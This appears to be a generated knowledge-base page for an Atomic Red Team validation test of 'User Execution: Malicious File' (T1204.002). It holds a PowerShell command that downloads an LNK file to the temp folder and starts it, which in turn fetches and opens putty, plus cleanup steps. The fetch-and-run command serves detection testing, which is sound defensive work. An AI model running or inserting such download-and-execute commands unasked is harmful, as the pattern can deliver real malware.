---
atomic_guid: "581d7521-9c4b-420e-9695-2aec5241167f"
title: "LNK Payload Download"
framework: "atomic"
generated: "true"
attack_technique_id: "T1204.002"
attack_technique_name: "User Execution: Malicious File"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1204.002/T1204.002.yaml"
build_date: "2026-04-26 17:02:12"
executor: "powershell"
aliases:
  - "581d7521-9c4b-420e-9695-2aec5241167f"
  - "LNK Payload Download"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# LNK Payload Download

This lnk files invokes powershell to download putty from the internet and opens the file. https://twitter.com/ankit_anubhav/status/1518932941090410496

## Metadata

- Atomic GUID: 581d7521-9c4b-420e-9695-2aec5241167f
- Technique: T1204.002: User Execution: Malicious File
- Platforms: windows
- Executor: powershell
- Source Path: atomics/T1204.002/T1204.002.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1204-user_execution|T1204.002]]

## Executor

- name: powershell

### Command

```powershell
Invoke-WebRequest -OutFile $env:Temp\test10.lnk "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/bin/test10.lnk"
$file1 = "$env:Temp\test10.lnk"
Start-Process $file1
Start-Sleep -s 10
taskkill /IM a.exe /F
```

### Cleanup

```powershell
$file1 = "$env:Temp\test10.lnk"
$file2 = "$env:Temp\a.exe"
Remove-Item $file1 -ErrorAction Ignore
Remove-Item $file2 -ErrorAction Ignore
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1204.002/T1204.002.yaml)
